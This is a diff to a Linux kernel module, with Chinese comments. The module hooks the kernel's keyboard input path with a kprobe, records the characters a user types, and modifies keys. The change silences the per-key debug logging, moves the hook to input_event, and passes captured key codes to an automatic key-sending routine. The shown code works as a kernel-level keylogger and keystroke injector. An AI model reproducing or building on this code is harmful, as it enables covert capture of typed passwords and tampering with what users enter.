@@ -4,12 +4,17 @@
 #include <linux/kernel.h>
 #include <linux/input.h>
 #include <linux/kprobes.h>
+#include <linux/kthread.h>
+#include <linux/err.h>
 #include <linux/kallsyms.h>
+#include <linux/delay.h>
 
 #include "common.h"
 
 extern bool key_record_status;
 extern spinlock_t record_index_lock;
+extern struct completion g_auto_sendkey_completion;
+extern struct dev_and_code d;
 
 bool key_caps_status = false;   // 打开为true，关闭为false
 bool key_shift_status = false;  // 按下为true，弹起为false
@@ -88,8 +93,8 @@ static struct kprobe kp = {
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
     unsigned long dev, type, code, value;
-    printk("%s dev = [%p], type = [%ld], code = [%ld], value =[%ld]\n",
-           __func__, regs->regs[0], regs->regs[1], regs->regs[2], regs->regs[3]);
+    /** printk("%s dev = [%p], type = [%ld], code = [%ld], value =[%ld]\n", */
+    /**        __func__, regs->regs[0], regs->regs[1], regs->regs[2], regs->regs[3]); */
 
     dev = regs->regs[0];
     type = regs->regs[1];
@@ -141,19 +146,19 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
         key_ctrl_status = left_key_ctrl_status | right_key_ctrl_status;
 
 
-        if (key_shift_status && key_caps_status) {
-            // shift 和 cpas同时激活
-            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode1[code], value ? "PRESSED":"RELEASED");
-        } else if (!key_shift_status && key_caps_status) {
-            // 只激活了caps
-            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode1[code], value ? "PRESSED":"RELEASED");
-        } else if (key_shift_status && !key_caps_status) {
-            // 只激活了shift
-            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode[code], value ? "PRESSED":"RELEASED");
-        } else {
-            // 最正常的扫描码，小写无特殊字符
-            printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode[code], value ? "PRESSED":"RELEASED");
-        }
+        /** if (key_shift_status && key_caps_status) { */
+        /**     // shift 和 cpas同时激活 */
+        /**     printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode1[code], value ? "PRESSED":"RELEASED"); */
+        /** } else if (!key_shift_status && key_caps_status) { */
+        /**     // 只激活了caps */
+        /**     printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode1[code], value ? "PRESSED":"RELEASED"); */
+        /** } else if (key_shift_status && !key_caps_status) { */
+        /**     // 只激活了shift */
+        /**     printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_special_keycode[code], value ? "PRESSED":"RELEASED"); */
+        /** } else { */
+        /**     // 最正常的扫描码，小写无特殊字符 */
+        /**     printk("%s current press key = [%c], status = [%s]\n", __func__, usb_kbd_keycode[code], value ? "PRESSED":"RELEASED"); */
+        /** } */
 
 
         // 可见字符记录及修改
@@ -176,6 +181,11 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
                     key_store_record(usb_kbd_keycode[code]);
                 }
                 modify_current_key_method1(&code, 1);
+
+				d.dev = (struct input_dev *)dev;
+				d.code = code;
+
+				complete(&g_auto_sendkey_completion);
             } else {
                 modify_current_key_method1(&code, 0);
             }
@@ -212,7 +222,8 @@ void install_hook_input_handle_event(void)
     kp.post_handler = handler_post;
     kp.fault_handler = handler_fault;
 
-    unsigned long addr = kallsyms_lookup_name("input_handle_event");
+	// 为防止重入，改hook input_event
+    unsigned long addr = kallsyms_lookup_name("input_event");
     printk("input_handle_event addr = %016lx\n", addr);
     kp.addr = addr;
     ret = register_kprobe(&kp);  /*注册kprobe*/
